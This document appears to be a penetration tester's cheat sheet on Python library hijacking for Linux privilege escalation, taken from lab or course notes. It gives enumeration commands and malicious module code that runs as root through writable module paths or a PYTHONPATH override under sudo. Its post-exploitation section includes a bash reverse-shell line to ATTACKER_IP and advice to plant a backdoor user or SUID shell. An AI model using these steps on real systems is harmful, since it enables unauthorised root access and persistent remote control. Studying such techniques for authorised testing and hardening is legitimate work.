### 1. Technique Name:

Python Library Hijacking
### 2. Summary:

Python Library Hijacking is a privilege escalation technique that abuses misconfigured permissions, module search paths, or environment variables in Python applications. If a Python script is executed with elevated privileges (e.g., via SUID or with `sudo`) and it imports a module from a writable or hijackable path, attackers can insert malicious code into that module or redirect imports to their own crafted modules.
### 3. Conditions / Requirements:

- Python script runs as root (e.g., via `sudo` or SUID)    
- The imported module:
    - Has writable permissions **OR**    
    - Is imported from a user-writable path that precedes the original in `PYTHONPATH` **OR**    
    - Is redirected via a manipulated `PYTHONPATH` environment variable    
- Attacker can correctly replicate the expected function signature and name
### 4. Enumeration Steps:
#### A. Check if Python script is SUID or runs with sudo:

```bash
ls -l <script>.py
sudo -l
```
#### B. Inspect imported modules inside the Python script:

Look for lines like:

```python
import psutil
from pandas import *
```
#### C. Find the moduleâ€™s location:

```bash
pip3 show psutil
```
#### D. Locate and examine function definitions:

```bash
grep -r "def virtual_memory" /path/to/module/
```
#### E. Verify writable permissions:

```bash
ls -l <module_file>.py
ls -ld <module_directory>
```
#### F. Print Python module search path:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```
### 5. Exploitation Steps:
#### A. **Wrong Write Permissions**:

1. Identify target function (`def virtual_memory()`)    
2. Inject malicious code:

```python
import os
os.system('id')
```

3. Run the SUID/`sudo` script:   

```bash
sudo /usr/bin/python3 ./mem_status.py
```

Output should confirm root access.
#### B. **Hijack via Library Path (sys.path priority)**:

1. Verify that `/usr/lib/python3.8` (or similar) is writable.    
2. Create a fake module:

```python
# /usr/lib/python3.8/psutil.py
import os
def virtual_memory():
    os.system('id')
```

3. Run script:    

```bash
sudo /usr/bin/python3 ./mem_status.py
```

#### C. **Hijack via PYTHONPATH**:

1. Move fake module to a controlled directory:

```bash
mv psutil.py /tmp/
```

2. Run with PYTHONPATH override: 

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
### 6. Post-Exploitation Tips:

- Replace `id` with a reverse shell or file read payload:    

```python
os.system('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')
```

- Drop a backdoor user or SUID shell once root is gained.
- Clean up:
    - Remove malicious modules
    - Restore original permissions
### 7. Example / Notes:

**SUID Python Script:**

```bash
-rwsrwxr-x 1 root mrb3n 188 mem_status.py
```

**Script Content:**

```python
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

**Hijacked Module Function:**

```python
def virtual_memory():
    import os
    os.system('id')
```

**Command to run hijacked library via PYTHONPATH:**

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

Output:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

This confirms successful privilege escalation via Python Library Hijacking.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Python_Library_Hijacking